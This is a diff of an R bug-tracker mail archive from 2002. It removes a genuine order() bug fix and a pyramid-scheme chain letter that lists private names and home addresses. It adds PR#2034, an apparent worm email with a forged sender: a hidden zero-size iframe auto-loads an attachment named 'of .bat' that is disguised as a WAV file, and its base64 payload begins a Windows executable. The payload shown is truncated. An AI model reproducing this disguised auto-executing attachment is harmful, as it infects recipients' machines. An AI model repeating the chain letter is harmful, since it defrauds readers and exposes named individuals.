@@ -18255,183 +18255,6 @@ Unless expressly stated otherwise, this message is confidential and may be privi
 Wed Jul 10 19:24:04 2002	thomas	changed notes
 Wed Jul 10 19:24:04 2002	thomas	foobar
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-* PR# 1981 *
-Subject: FIX FOR OLD AND NEW PROBLEMS with order(): order fails with na.last=NA
-From: oehl_list@gmx.de
-Date: Tue, 3 Sep 2002 21:12:47 +0200 (MEST)
---1 and 2 were already fixed for 1.6.0
-~~~~~~~~~~ original reports follow ~~~~~~~~~~
-==> 1981 <==
-From oehl_list@gmx.de  Tue Sep  3 21:13:54 2002
-Received: from mx0.gmx.net (mx0.gmx.net [213.165.64.100])
-	by pubhealth.ku.dk (8.9.3/8.9.1) with SMTP id VAA15643
-	for <r-bugs@biostat.ku.dk>; Tue, 3 Sep 2002 21:13:54 +0200 (MET DST)
-From: oehl_list@gmx.de
-Received: (qmail 27038 invoked by uid 0); 3 Sep 2002 19:12:47 -0000
-Date: Tue, 3 Sep 2002 21:12:47 +0200 (MEST)
-To: r-bugs@biostat.ku.dk
-MIME-Version: 1.0
-Subject: FIX FOR OLD AND NEW PROBLEMS with order(): order fails with na.last=NA
-X-Priority: 1 (Highest)
-X-Authenticated-Sender: #0013971831@gmx.net
-X-Authenticated-IP: [213.61.157.2]
-Message-ID: <22354.1031080367@www43.gmx.net>
-X-Mailer: WWW-Mail 1.5 (Global Message Exchange)
-X-Flags: 0001
-Content-Type: text/plain; charset="iso-8859-1"
-Content-Transfer-Encoding: 8bit
-
-I recently reported order() to ignore decreasing=TRUE with na.last=NA.
-Now I discovered two other problems and send corrected code.
-
-Best regards
-
-
-Jens Oehlschlägel
-
-
-# PROBLEM 1 see PR#1906
-
-
-# PROBLEM 2
-> order(1, na.last=NA)
-Error in apply(sapply(z, is.na), 1, any) : 
-        dim(X) must have a positive length
-# clearly wrong as
-> order(1)
-[1] 1
-# is defined
-
-
-# PROBLEM 3
-> order(c(NA, NA), na.last=NA)
-Error in order(c(NA, NA), na.last = NA) : all elements contain an NA
-# The help file promises ordering indices to all non-NA elements. 
-# Thus, if all elements are NA, consequently the result should be integer(0)
-# The prototype also returns integer(0) and additionally gives a warning
-from sort.list()
-
-
-# Here are fixes for all three problems
-
-# save old version for comparision below
-old.order <- order  
-
-
-order <- function (..., na.last = TRUE, decreasing = FALSE)
-{
-    if (!is.na(na.last)) 
-        .Internal(order(na.last, decreasing, ...))
-    else {
-        z <- list(...)
-        if (any(diff(sapply(z, length)) != 0)) 
-            stop("Argument lengths differ")
-        ok <- !apply(matrix(sapply(z, is.na), nrow=length(z[[1]]),
-ncol=length(z)), 1, any)  # make shure the result of sapply is a matrix
-        if (all(!ok)){
-            # stop("all elements contain an NA")	# don't turn all-NA into a
-stop error
-            return(integer(0))				# don't turn all-NA into a stop error
-        }
-        z[[1]][!ok] <- NA
-        z[["decreasing"]] <- decreasing  		# put decreasing= into parameters
-passed to next call of order
-        ans <- do.call("order", z)
-        keep <- seq(length = sum(ok))  			# simplify and (theoretical) speed
-up
-        ans[keep]					# simplify and (theoretical) speed up
-    }
-}
-
-x1 <- rep(1, 3)
-x2 <- c(1, NA, 2)
-order(x1, x2)
-old.order(x1, x2)
-order(x1, x2, decreasing=TRUE)
-old.order(x1, x2, decreasing=TRUE)
-order(x1, x2, na.last=FALSE)
-old.order(x1, x2, na.last=FALSE)
-order(x1, x2, decreasing=TRUE, na.last=FALSE)
-old.order(x1, x2, decreasing=TRUE, na.last=FALSE)
-order(x1, x2, na.last=NA)
-old.order(x1, x2, na.last=NA)
-order(x1, x2, decreasing=TRUE, na.last=NA)
-old.order(x1, x2, decreasing=TRUE, na.last=NA)
-
-order(1, na.last=NA)
-old.order(1, na.last=NA)
-
-order(c(NA, NA), na.last=NA)
-old.order(c(NA, NA), na.last=NA)
-
-
-
-# results
-
-> x1 <- rep(1, 3)
-> x2 <- c(1, NA, 2)
-> order(x1, x2)
-[1] 1 3 2
-> old.order(x1, x2)
-[1] 1 3 2
-> order(x1, x2, decreasing=TRUE)
-[1] 3 1 2
-> old.order(x1, x2, decreasing=TRUE)
-[1] 3 1 2
-> order(x1, x2, na.last=FALSE)
-[1] 2 1 3
-> old.order(x1, x2, na.last=FALSE)
-[1] 2 1 3
-> order(x1, x2, decreasing=TRUE, na.last=FALSE)
-[1] 2 3 1
-> old.order(x1, x2, decreasing=TRUE, na.last=FALSE)
-[1] 2 3 1
-> order(x1, x2, na.last=NA)
-[1] 1 3
-> old.order(x1, x2, na.last=NA)
-[1] 1 3
-> order(x1, x2, decreasing=TRUE, na.last=NA)
-[1] 3 1
-> old.order(x1, x2, decreasing=TRUE, na.last=NA)
-[1] 1 3
-> 
-> order(1, na.last=NA)
-[1] 1
-> old.order(1, na.last=NA)
-Error in apply(sapply(z, is.na), 1, any) : 
-        dim(X) must have a positive length
-> 
-> order(c(NA, NA), na.last=NA)
-numeric(0)
-> old.order(c(NA, NA), na.last=NA)
-Error in old.order(c(NA, NA), na.last = NA) : 
-        all elements contain an NA
-
-
-
-> version
-         _              
-platform i386-pc-mingw32
-arch     i386           
-os       Win32          
-system   i386, mingw32  
-status                  
-major    1              
-minor    5.1            
-year     2002           
-month    06             
-day      17             
-language R  
-
--- 
-GMX - Die Kommunikationsplattform im Internet.
-http://www.gmx.net
-
-
-==> 1981.audit <==
-Tue Sep  3 21:52:16 2002	thomas	changed notes
-Tue Sep  3 21:52:16 2002	thomas	foobar
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * PR# 2003 *
 Subject: rhome.c: getRHOME() fails, if R is called from SJava
 From: grimm.heinz@rcc.ch
@@ -19318,519 +19141,11 @@ Uwe Ligges
 
 ====================================================
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-* PR# 2032 *
-Subject: Earn THOUSAND US$ in Multi-Level Email Reports 
-From: moneyforu@money.com
-Date: Tue, 17 Sep 2002 09:07:18 -0600
--- no notes --
-~~~~~~~~~~ original reports follow ~~~~~~~~~~
-==> 2032 <==
-From postmaster@franz.stat.wisc.edu  Tue Sep 17 17:04:14 2002
-Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
-	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA29785
-	for <r-bugs@biostat.ku.dk>; Tue, 17 Sep 2002 17:04:13 +0200 (MET DST)
-Received: from money.com (really [68.35.106.95]) by franz.stat.wisc.edu
-	via smail with smtp
-	id <m17rJt0-000IYGC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
-	for <r-bugs@r-project.org>; Tue, 17 Sep 2002 10:03:34 -0500 (CDT) 
-Message-Id: <m17rJt0-000IYGC@franz.stat.wisc.edu>
-Content-Type: text/plain; charset="US-ASCII"
-Date: Tue, 17 Sep 2002 09:07:18 -0600
-To: r-bugs@r-project.org
-From: moneyforu@money.com
-X-Mailer: Version 5.0
-Subject: Earn THOUSAND US$ in Multi-Level Email Reports 
-Organization: 
-MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
-
-Dear Future Millionaire !
- 
-I'll make you a promise. READ THIS TO THE END !
-
-Follow what it says to the letter - and you will 
-NEVER worry whether a RECESSION is coming or not, 
-who is your Country's President, or whether you 
-keep your current job or not. 
-
-Yes, I know what you are thinking. I never 
-responded to one of these before either ! 
-
-One day though, something just said "you throw 
-away $25.00 going to a movie for 2 hours". 
-
-"What the heck." Believe me, no matter where you 
-believe "those feelings" come from, I thank 
-goodness every day that I had that feeling. 
-I cannot imagine where I would be or what I 
-would be doing had I not. 
-
-Read on. It's TRUE. Every word of it !
-
-It is LEGAL as in the truest sense of the word !
-
-Simply because you are buying something of value ! 
-************************************************** 
-AS SEEN ON NATIONAL TV: 
- 
-Making over half million dollars every 4 to 5 
-months from the comfort of your home ! 
- 
-THANKS TO THE COMPUTER AGE AND THE INTERNET! 
-
-BE AN INTERNET MILLIONAIRE LIKE OTHERS WITHIN A YEAR! 
- 
-Before you say, "Bull", please read the following. 
-This is the letter you have been hearing about on 
-the news lately. Due to the popularity of this 
-letter on the Internet, a national weekly news 
-program recently devoted entire show to the 
-investigation of this program described below, to 
-see if it really can make people money. 
-
-The show also investigated whether or not the 
-program was legal. 
- 
-Their findings proved once and for all that there 
-is "absolutely NO Laws prohibiting the participation 
-in the program, and if people can  follow the simple 
-instruction, " they are bound to make some mega 
-bucks with only $25 out of pocket cost". 
-
-DUE TO THE RECENT INCREASE OF POPULARITY & RESPECT 
-THIS PROGRAM HAS ATTAINED, IT IS CURRENTLY WORKING 
-BETTER THAN EVER ! 
-*************************************************** 
-This is what one had to say: 
-"Thanks to this profitable opportunity". I was 
-approached many times before but each time I passed 
-on it. I am so glad I finally joined just to see 
-what one could expect in return for the minimal 
-effort and money required. 
- 
-To my astonishment, I received a total $610,470.00 
-in 21 weeks, with money still coming in". 
-Pam Hedland, Fort Lee, New Jersey. 
-*************************************************** 
-Another said: 
-"This program has been around for a long time but I 
-never believed in it. But one day when I received 
-this again in the mail I decided to gamble my $25 on 
-it. I followed the simple instructions and walaa….
-3 weeks later the money started to come in. 
-
-First month I only made $240.00 but the next 2 months 
-after that,I made a total of $290,000.00. 
-
-So far, in the past 8 months by re-entering the 
-program, I have made over $710,000.00 and I am 
-playing it again. 
-
-The key to success in this program is to follow the 
-simple steps and NOT change anything." 
-***************************************************
-More testimonials later but first: 
-
-=====PRINT THIS NOW FOR YOUR FUTURE REFERENCE===== 
-$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 
- 
-If you would like to make at least $500,000 every 
-4 to 5 months easily and comfortably, please read 
-the following…THEN READ IT AGAIN and AGAIN!!! 
- 
-$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ 
- 
-FOLLOW THE SIMPLE INSTRUCTION BELOW AND YOUR 
-FINANCIAL DREAMS WILL COME TRUE, GUARANTEED! 
- 
-INSTRUCTIONS: 
- 
-===Order all 5 reports shown on the list below=== 
- 
-For each report, send $5 CASH, THE NAME & NUMBER 
-OF THE REPORT YOU ARE ORDERING and YOUR E-MAIL 
-ADDRESS to the person whose name appears ON THAT 
-LIST next to the report. MAKE SURE YOUR RETURN 
-ADDRESS IS ON YOUR ENVELOPE TOP LEFT CORNER in 
-case of any mailing problems. 
- 
-WHEN YOU PLACE YOUR ORDER, MAKE SURE YOU ORDER 
-EACH OF THE 5 REPORTS.
- 
-You will need all 5 reports so that you can save 
-them on your computer and resell them. 
-
-YOUR TOTAL COST $5 X 5 = $25.00 
- 
-Within a few days you will receive, via e-mail, 
-each of the 5 reports from these 5 different 
-individuals. 
-
-Save them on your computer so they will be 
-accessible for you to send to the 1,000's of 
-people who will order them from you. Also, make 
-a floppy of these reports and keep it on your 
-desk in case something happens to your computer. 
- 
-IMPORTANT - DO NOT alter the names of the people 
-who are listed next to each report, or their 
-sequence on the list, in any way other than what 
-is instructed below in step "1 through 6". 
-
-Or you will lose out on the majority of your 
-profits. 
-
-Once you understand the way this works, you will 
-also see how it does not work if you change it. 
-
-Remember, this method has been tested, and if you 
-alter it, it will NOT work!!! 
-
-People have tried to put their friends/relatives 
-names on all five thinking they could get all the
-money. But it doesn't work this way. Believe us, 
-some have tried to be greedy and then nothing 
-happened. 
-
-So Do Not try to change anything other than what 
-is instructed. Because if you do, it will not work 
-for you. 
-
-Remember, HONESTY reaps the REWARDS!!! 
-
-This IS a legitimate BUSINESS powered by the 
-present Information Technology we call the INTERNET,  
-the INCOME generating capacity of MULTI-LEVEL-MARKETING,
-and the effectiveness of DIRECT MAIL ORDER System !
-
-The name of this program is MULTI-LEVEL EMAIL REPORTS,
-And Our Products are " How To " Informations !
-
-YOU ARE ACTUALLY RUNNING AN INFORMATION SERVICES 
-BUSINESS !
- 
-You are offering these products for sale and getting 
-paid for it. Treat it as such and you will be VERY 
-PROFITABLE in a SHORT period of TIME ! 
- 
-1. After you have ordered all 5 reports, take this 
-   advertisement and REMOVE the name & address of 
-   the person in REPORT #5. 
-    
-   This person has made it through the cycle and is 
-   no doubt counting his fortunes.
- 
-2. Move the name & address in REPORT #4 down to 
-   REPORT #5. 
-
-3. Move the name & address in REPORT #3 down to 
-   REPORT #4. 
-
-4. Move the name & address in REPORT #2 down to 
-   REPORT #3. 
-
-5. Move the name & address in REPORT #1 down to 
-   REPORT #2. 
-
-6. Insert YOUR name & address in the REPORT #1 
-   Position. 
- 
-PLEASE MAKE SURE you copy every name & address 
-ACCURATELY! 
-
-This is critical to YOUR success ! 
-************************************************* 
-Take this entire letter, with the modified list of 
-names, and save it on your computer. 
-
-DO NOT MAKE ANY OTHER CHANGES. 
- 
-Save this on a disk as well just in case if you 
-lose any data. To assist you with marketing your 
-business on the internet, the 5 reports you purchase 
-will provide you with invaluable marketing 
-information which includes how to send bulk 
-e-mails legally, where to find thousands of free 
-classified ads and much more. 
- 
-There are 2 Primary methods to get this venture going: 
- 
-METHOD#1: BY SENDING BULK E-MAIL LEGALLY 
-========================================
-Let's say that you decide to start small, just to 
-see how it goes, and we will assume you and those 
-involved send out only 5,000 e-mails each. Let's 
-also assume that the mailing receive only a 0.2% 
-(2/10 of 1%) response (the response could be much 
-better but lets just say it is only 0.2%). 
-
-Also many people will send out hundreds of 
-thousands e-mails instead of only 5,000 each). 
-
-Continuing with this example, you send out only 
-5,000 e-mails. 
-
-With a 0.2% response, that is only 10 orders for 
-Report #1. 
-
-Those 10 people responded by sending out 5,000 
-e-mails each for a total of 50,000. Out of those 
-50,000 e-mails only 0.2% responded with orders. 
-
-That's=100 people responded and ordered Report #2. 
- 
-Those 100 people mail out 5,000 e-mails each for 
-a total of 500,000 e-mails. 
-
-The 0.2% response to that is1000 orders for 
-Report #3. 
- 
-Those 1000 people send 5,000 e-mails each for a 
-total of 5 million e-mails sent out. The 0.2% 
-response is 10,000 orders for Report #4. 
- 
-Those 10,000 people send out 5,000 e-mails each 
-for a total of 50,000,000 (50 million) e-mails. 
-
-The 0.2% response to that is 100,000 orders for 
-Report #5. 
- 
-THAT'S 100,000 ORDERS TIMES $5 EACH = $500,000.00 
-(half a million dollars) ! 
- 
-Your total income in this example is: 
-1…. $50+2….. $500+3….. $5,000+4….. 
-    $50,000+5…. $500,000…. Grand total $555,550.00 
-
-NUMBERS DO NOT LIE. GET A PENCIL & PAPER AND FIGURE 
-OUT THE WORST POSSIBLE RESPONSES AND NO MATTER HOW 
-YOU CALCULATE IT, YOU WILL  STILL MAKE A LOT OF 
-MONEY! 
-*************************************************** 
-REMEMBER FRIEND, THIS IS ASSUMING ONLY 10 PEOPLE 
-ORDERING OUT OF 5,000 YOU MAILED TO. 
-
-Dare to think for a moment what would happen if 
-everyone or half or even 4th of those people 
-mailed 100,000 e-mails each or more? 
-
-There are over 150 million people on the Internet 
-worldwide and counting, with thousands more coming 
-on line every day. 
-
-Believe me, many people will do just that and more! 
- 
-METHOD #2: BY PLACING FREE ADS ON THE INTERNET 
-============================================== 
-Advertising on the net is very, very inexpensive 
-and there are hundreds of FREE places to advertise. 
-
-Placing a lot of free ads on the Internet will 
-easily get a larger response. 
-
-We strongly suggest you start with Method #1 and 
-add Method #2 as you go along. 
-
-For every $5 you receive, all you must do is 
-e-mail the Report to the recipient immediately 
-as possible. 
-
-That's it. Always provide same day service on 
-all orders. 
- 
-This will guarantee that the e-mail they send out, 
-with your name and address on it, will be prompt 
-because they cannot advertise until they receive 
-the report. 
-************************************************ 
-AVAILABLE REPORTS 
-
-The reason for the "CASH" is not because this is 
-illegal or somehow "wrong". 
-
-It is simply about TIME. Time for checks or credit 
-cards to be cleared or approved, etc. Concealing 
-it simply so no one can SEE if there is money in 
-the envelope and steal it before it gets to you. 
- 
-ORDER EACH REPORT BY ITS NUMBER & NAME ONLY. 
-
-Notes: 
-
-Always send $5 cash (U.S. CURRENCY) for each 
-Report. 
-
-Checks NOT accepted. Make sure the cash is 
-concealed by wrapping it in at least 2 sheets 
-of paper. 
-
-In one of those sheets of paper write the NUMBER 
-& NAME of the Report you are ordering, YOUR 
-E-MAIL ADDRESS and YOUR NAME and Postal Address. 
-************************************************ 
-PLACE YOUR ORDER FOR THESE REPORTS NOW: 
- 
-REPORT #1: The Insider's Guide to Advertising for 
-           Free On The Net 
- 
-	Order Report #1 from: 
- 
-		Meg Colby
-		1528 Figueroa St NE
-		Albuquerque, NM 87112
-		USA
-_________________________________________________ 
- 
-REPORT #2: The Insider's Guide to Sending Bulk -
-           Email on the Net 
- 
-	Order Report #2 from: 
- 
-		Jsajm Marie Quino
-		PO Box 292
-		MCPO Subangdaku
-		Mandaue City 6014 Cebu 
-		Philippines
-_________________________________________________ 
- 
-REPORT #3: Secret to Multilevel Marketing On The Net 
- 
-	Order Report #3 from: 
- 
-		Denise Wyka	
-		13719 Ironwood Circle
-		Lockport, IL 60441 
-		USA 
-_________________________________________________ 
-
-REPORT #4: How To Become Millionaire Using MLM & 
-           The Net 
- 
-	Order Report #4 from: 
- 
-		Patty Hamer
-		330 W. Sycamore St. 1W
-		Sycamore, IL 60178
-		USA 
-_________________________________________________ 
- 
-REPORT #5: How To Send Out One Million Emails 
-           for Free 
- 
-	Order Report #5 From: 
- 
-		Monty McCurry
-		3140 So. Peoria St. #139
-		Aurora, CO 80014-3155
-		USA 
-_________________________________________________ 
- $$$$$$$$$$$ YOUR SUCCESS GUIDELINES  $$$$$$$$$$$ 
- 
-Follow these guidelines to guarantee your success: 
- 
-If you do not receive at lest 10 orders for Report 
-#1 within 2 weeks, continue sending e-mails until 
-you do. 
- 
-After you have received 10 orders, 2 to 3 weeks 
-after that you should receive 100 orders or more 
-for REPORT #2. 
-
-If you did not, continue advertising or sending 
-e-mails until you do. 
- 
-Once you have received 100 or more orders for 
-Report #2, YOU CAN RELAX, because the system is 
-already working for you, and the cash will 
-continue to roll in! 
-
-THIS IS IMPORTANT TO REMEMBER: 
-Every time your name is moved down on the list, 
-you are placed on a different report. 
- 
-You can KEEP TRACK of your PROGRESS by watching 
-which report people are ordering from you. 
-
-IF YOU WANT TO GENERATE MORE INCOME, SEND ANOTHER  
-BATCH OF E-MAILS AND START THE WHOLE PROCESS AGAIN. 
-
-There is NO LIMIT  to the income you can generate 
-from this business!!! 
-
-************************************************ 
-FOLLOWING IS A NOTE FROM THE ORGINATOR OF THIS 
-PROGRAM: 
-
-You have just received information that can give 
-you financial freedom for the rest of your life, 
-with NO RISK and JUST A LITTLE BIT OF EFFORT. 
-
-You can make more money in the  next few weeks 
-and months than you have ever imagined. 
-
-Follow the program EXACTLY AS INSTRUCTED. 
-
-Do Not change it in any way. It works exceedingly 
-well as it is now. 
- 
-Remember to e-mail a copy of this exciting report 
-after you have put your NAME and ADDRESS in 
-Report #1, and moved others to #2…..#5 as 
-instructed above. 
-
-One of the people you send this to may send out 
-100,000 or more e-mails and your name will be on 
-every one of them. 
-
-Remember though, the more you send out emails, 
-the more potential customers you will reach. 
-
-So my friend, I have given you the ideas, 
-information, materials and opportunity to become 
-financially independent. 
-
-IT IS UP TO YOU NOW!!! 
- 
-===============MORE TESTIMONIALS================ 
- 
-"My name is Mitchell. My wife, Jody and I live in 
-Chicago. I am an accountant with a major U.S. 
-Corporation and I make pretty good money. When I 
-received this program I grumbled to Jody about 
-receiving "junk mail". I made fun of the whole thing, 
-spouting my knowledge of the population and 
-percentages involved. 
-
-I "knew" it wouldn't work. Jody totally ignored my 
-supposed intelligence and few days later she jumped 
-in with both feet. I made merciless fun of her, and 
-was ready to lay the old "I told you so" on her 
-when the thing didn't work. 
-
-Well, the laugh was on me! 
-
-Within 3 weeks she had received 50 responses. 
-Within the next 45 days she received total 
-$147,200.00.all CASH! 
-
-I was shocked. I have joined Jody in her "hobby". 
-Mitchell Wolf C.P.A., Chicago, Illinois 
-************************************************* 
-"Not being the gambling type, it took me several 
-weeks to make up my mind to participate in this 
-plan. But conservative as I am, I decided that the 
-initial investment was so little that there was 
-just no way that I wouldn't get enough orders to 
-at least get my money back".
-
-"I was surprised when I found my medium size post 
-office box crammed with orders. 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * PR# 2033 *
 Subject: switch
 From: rwehrens@sci.kun.nl
 Date: Tue, 17 Sep 2002 23:25:39 +0200 (MET DST)
--- no notes --
+--not a bug; but worth a documentation hint
 ~~~~~~~~~~ original reports follow ~~~~~~~~~~
 ==> 2033 <==
 From rwehrens@sci.kun.nl  Tue Sep 17 23:25:40 2002
@@ -19963,4 +19278,1093 @@ switchme <- function(type, ...) {
   c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
  (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
 ~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907
+
+==> 2033.audit <==
+Wed Sep 18 11:01:56 2002	maechler	changed notes
+Wed Sep 18 11:01:56 2002	maechler	foobar
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+* PR# 2034 *
+Subject: Data between machines.
+From: gshoema <gshoema@sandia.gov>
+Date: Wed, 18 Sep 2002 05:26:59 -0400 (EDT)
+-- no notes --
+~~~~~~~~~~ original reports follow ~~~~~~~~~~
+==> 2034 <==
+From postmaster@franz.stat.wisc.edu  Wed Sep 18 11:38:36 2002
+Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA05691
+	for <r-bugs@biostat.ku.dk>; Wed, 18 Sep 2002 11:38:33 +0200 (MET DST)
+Received: from smtp4.avon.net (really [63.65.123.54]) by franz.stat.wisc.edu
+	via smail with esmtp
+	id <m17rb74-000IaDC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
+	for <r-bugs@r-project.org>; Wed, 18 Sep 2002 04:27:14 -0500 (CDT) 
+Received: from Nmbusjo (12-232-111-200.client.attbi.com [12.232.111.200])
+	by smtp4.avon.net (8.9.3/8.9.3) with SMTP id FAA20505
+	for <r-bugs@r-project.org>; Wed, 18 Sep 2002 05:26:59 -0400 (EDT)
+Date: Wed, 18 Sep 2002 05:26:59 -0400 (EDT)
+Message-Id: <200209180926.FAA20505@smtp4.avon.net>
+From: gshoema <gshoema@sandia.gov>
+To: r-bugs@r-project.org
+Subject: Data between machines.
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary=G4Kgw01aARSV
+
+--G4Kgw01aARSV
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD></HEAD><BODY>
+<iframe src=3Dcid:I5P2vMX3ylV3049E8Z3 height=3D0 width=3D0>
+</iframe>
+<FONT></FONT></BODY></HTML>
+
+--G4Kgw01aARSV
+Content-Type: audio/x-wav;
+	name=of .bat
+Content-Transfer-Encoding: base64
+Content-ID: <I5P2vMX3ylV3049E8Z3>
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4g
+RE9TIG1vZGUuDQ0KJAAAAAAAAAAYmX3gXPgTs1z4E7Nc+BOzJ+Qfs1j4E7Pf5B2zT/gTs7Tn
+GbNm+BOzPucAs1X4E7Nc+BKzJfgTs7TnGLNO+BOz5P4Vs134E7NSaWNoXPgTswAAAAAAAAAA
+UEUAAEwBBAC4jrc8AAAAAAAAAADgAA8BCwEGAADAAAAAkAgAAAAAAFiEAAAAEAAAANAAAAAA
+QAAAEAAAABAAAAQAAAAAAAAABAAAAAAAAAAAYAkAABAAAAAAAAACAAAAAAAQAAAQAAAAABAA
+ABAAAAAAAAAQAAAAAAAAAAAAAAAg1gAAZAAAAABQCQAQAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ANAAAOwBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAEq6AAAAEAAAAMAAAAAQ
+AAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAAAiEAAAANAAAAAgAAAA0AAAAAAAAAAAAAAAAAAA
+QAAAQC5kYXRhAAAAbF4IAADwAAAAUAAAAPAAAAAAAAAAAAAAAAAAAEAAAMAucnNyYwAAABAA
+AAAAUAkAEAAAAABAAQAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
